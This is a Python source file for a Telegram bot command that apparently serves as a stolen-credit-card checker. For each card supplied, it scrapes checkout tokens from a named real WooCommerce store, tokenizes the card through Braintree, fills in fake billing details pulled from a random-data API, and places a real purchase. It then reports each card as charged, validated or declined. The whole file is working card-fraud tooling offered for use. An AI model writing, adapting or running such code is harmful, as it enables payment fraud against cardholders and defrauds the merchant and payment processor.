import requests
import json
import time
import base64

def process_nonsk2_command(bot, message):
    chat_id = message.chat.id
    card_data = message.text.split()[1:]  # Get the card data from the command
    if card_data:
        total_cards = len(card_data)
        start_time = time.time()
        results = []
        initial_message = "↯ NONSK2 CHECKER\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))

        for card in card_data:
            result = check_nonsk2(card)
            results.append(f"Card: {card}\nResponse => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide card details in the format: /nonsk2 cc|mm|yy|cvc")

def check_nonsk2(card):
    cc, mes, ano, cvv = card.split('|')
    retry = 0

    while retry < 3:
        try:
            cookies = requests.cookies.RequestsCookieJar()
            correlation_id = str(time.time()).replace('.', '')

            # Mockaroo API call to get random user details
            key = "bf1e2760"
            country = 'united_states'
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
            url = f"https://my.api.mockaroo.com/{country}.json?key={key}"
            response = requests.get(url, headers={'User-Agent': user_agent}, cookies=cookies)
            user_data = response.json()

            # Set default values for fields in case they are missing
            first = user_data.get('first', 'John')
            last = user_data.get('last', 'Doe')
            email = user_data.get('email', 'john.doe@example.com')
            phone = user_data.get('phone', '555-555-5555')
            street = user_data.get('street', '123 Main St')
            zip_code = user_data.get('zip', '12345')
            city = user_data.get('city', 'Anytown')
            state1 = user_data.get('state1', 'CA')
            state2 = user_data.get('state2', 'CA')

            # Fetch IP
            response = requests.get("https://api.ipify.org/", headers={'User-Agent': user_agent}, cookies=cookies)
            ip_address = response.text

            # Add product to cart
            url = "https://reinrespects.com/product/respect-our-parks-dog-bandana-with-a-cause/"
            data = {
                "attribute_pa_color": "green",
                "wc_braintree_paypal_amount": 8.95,
                "wc_braintree_paypal_currency": "USD",
                "wc_braintree_paypal_locale": "en_us",
                "wc_braintree_paypal_single_use": 1,
                "wc_braintree_paypal_product_id": 690,
                "quantity": 1,
                "add-to-cart": 690,
                "product_id": 690,
                "variation_id": 701
            }
            headers = {
                "User-Agent": user_agent,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Referer": "https://reinrespects.com/product/respect-our-parks-dog-bandana-with-a-cause/",
            }
            response = requests.post(url, headers=headers, data=data, cookies=cookies)

            # Proceed to checkout
            url = "https://reinrespects.com/checkout/"
            response = requests.get(url, headers={'User-Agent': user_agent}, cookies=cookies)
            checkout_nonce = extract_string(response.text, 'woocommerce-process-checkout-nonce" value="', '"')
            wcal_guest_capture_nonce = extract_string(response.text, 'wcal_guest_capture_nonce" value="', '"')
            client_token_nonce = extract_string(response.text, 'client_token_nonce":"', '"')

            if not checkout_nonce or not wcal_guest_capture_nonce or not client_token_nonce:
                raise ValueError("Failed to retrieve necessary nonce values from the checkout page.")

            # Get client token
            url = "https://reinrespects.com/wp-admin/admin-ajax.php"
            data = {
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": client_token_nonce
            }
            response = requests.post(url, headers=headers, data=data, cookies=cookies)
            encoded_data = extract_string(response.text, '{"success":true,"data":"', '"')

            if not encoded_data:
                raise ValueError("Failed to retrieve encoded client token data.")

            decoded_data = base64.b64decode(encoded_data).decode('utf-8')
            authorization_fingerprint = json.loads(decoded_data).get('authorizationFingerprint')

            if not authorization_fingerprint:
                raise ValueError("Failed to retrieve authorization fingerprint.")

            # Tokenize credit card
            url = "https://payments.braintree-api.com/graphql"
            headers.update({
                "Content-Type": "application/json",
                "Braintree-Version": "2018-05-10",
                "Authorization": f"Bearer {authorization_fingerprint}"
            })
            data = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": correlation_id
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mes,
                            "expirationYear": ano,
                            "cvv": cvv
                        },
                        "options": {
                            "validate": False
                        }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            response = requests.post(url, headers=headers, json=data, cookies=cookies)
            response_json = response.json()
            token = response_json['data']['tokenizeCreditCard']['token']

            # Checkout
            url = "https://reinrespects.com/?wc-ajax=checkout"
            data = {
                "billing_first_name": first,
                "billing_last_name": last,
                "billing_country": "US",
                "billing_address_1": street,
                "billing_city": city,
                "billing_state": state2,
                "billing_postcode": zip_code,
                "billing_phone": phone,
                "billing_email": email,
                "wcal_guest_capture_nonce": wcal_guest_capture_nonce,
                "_wp_http_referer": "/checkout/",
                "mailchimp_woocommerce_newsletter": 1,
                "shipping_country": "US",
                "shipping_method[0]": "free_shipping:2",
                "payment_method": "braintree_credit_card",
                "wc-braintree-credit-card-card-type": "visa",
                "wc-braintree-credit-card-3d-secure-order-total": "8.95",
                "wc_braintree_credit_card_payment_nonce": token,
                "wc_braintree_paypal_amount": "8.95",
                "wc_braintree_paypal_currency": "USD",
                "wc_braintree_paypal_locale": "en_us",
                "terms": "on",
                "terms-field": 1,
                "woocommerce-process-checkout-nonce": checkout_nonce,
                "_wp_http_referer": "/?wc-ajax=update_order_review"
            }
            headers.update({
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://reinrespects.com",
                "Referer": "https://reinrespects.com/checkout/"
            })
            response = requests.post(url, headers=headers, data=data, cookies=cookies)
            response_data = response.json()

            if "order-received" in response.text:
                receipt_url = response_data.get('redirect', 'Receipt URL not found')
                return f"CHARGED {card} <a href='{receipt_url}' target='_blank'>Receipt</a> {ip_address}"
            elif "The card verification number does not match" in response.text:
                return f"VALIDATED {card} {response_data['messages']} {ip_address}"
            elif "The provided address does not match the billing address" in response.text:
                return f"VALIDATED {card} {response_data['messages']} {ip_address}"
            else:
                return f"DECLINED {card} {json.dumps(response_data)}"

        except Exception as e:
            retry += 1
            if retry >= 3:
                return f"An error occurred: {str(e)}"
            time.sleep(1)

def extract_string(content, start, end):
    try:
        return content.split(start)[1].split(end)[0]
    except IndexError:
        return None

def get_footer_info(total_cards, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"🔹 Total Cards Checked - {total_cards}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
